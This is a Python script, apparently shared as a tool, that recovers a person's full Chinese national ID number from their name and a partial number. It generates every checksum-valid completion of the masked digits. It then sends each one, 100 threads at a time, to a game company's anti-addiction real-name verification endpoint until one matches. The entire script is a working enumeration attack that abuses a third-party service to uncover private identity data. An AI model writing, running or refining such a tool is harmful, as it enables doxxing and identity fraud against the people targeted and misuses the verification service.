import requests
import json
import random
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
print('欢迎使用小猫の非库补💫\nby  @XiaoMaoFish🥳\n欢迎管理员👮🏻‍♂️')

def check_id(id_card):
    session = requests.Session()
    url = "https://agent.cronlygames.cn/antiaddiction/nameverify.php"
    payload = json.dumps({"ai": str(random.randint(10**17, 10**18 - 1)), "action": "verify", "card": id_card, "name": name})
    headers = {'User-Agent': "Custom-Agent", 'Content-Type': "application/json"}
    try:
        res = session.post(url, data=payload, headers=headers, timeout=10)
        if res.status_code == 200 and res.json().get("data", {}).get("result", {}).get("status") == 0:
            return id_card
    except requests.RequestException:
        pass
    return None

def validate_id(n):
    if not 1950 <= int(n[6:10]) <= 2022 or int(n[10:12]) > 12 or int(n[12:14]) > 31: return False
    v = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    v_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    return v_id[sum(int(n[i]) * v[i] for i in range(17)) % 11] == n[17]

def gen_id(card):
    cs = [[ch] if ch != 'x' else list("0123456789") for ch in card]
    if card[16] == 'x':
        g = input("🚹性别:\n >").strip()
        cs[16] = ["1", "3", "5", "7", "9"] if g == "男" else ["0", "2", "4", "6", "8"] if g == "女" else list("0123456789")

    with open('sfz.fk', 'w', encoding='utf-8') as f:
        for r in itertools.product(*cs):
            s = "".join(r)
            if len(s) == 18 and validate_id(s): f.write(s + "\n")

name = input("♿️请输入姓名:\n >")
gen_id(input('🆔输入身份证:\n >'))
ids = open("sfz.fk").read().splitlines()
print(f"⚠️准备核验 {len(ids)} 个身份证号中")
success = []
with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(check_id, id_card) for id_card in ids]
    for i, future in enumerate(as_completed(futures), 1):
        print(f"\r♻️{i}/{len(ids)}", end="", flush=True)
        result = future.result()
        if result:
            success.append(result)
            print(f" ✅ 核验成功 {result}")
if success:
    print("\n🟢核验已完成")
else:
    print("\n🔴空 没有核验成功的身份证号")
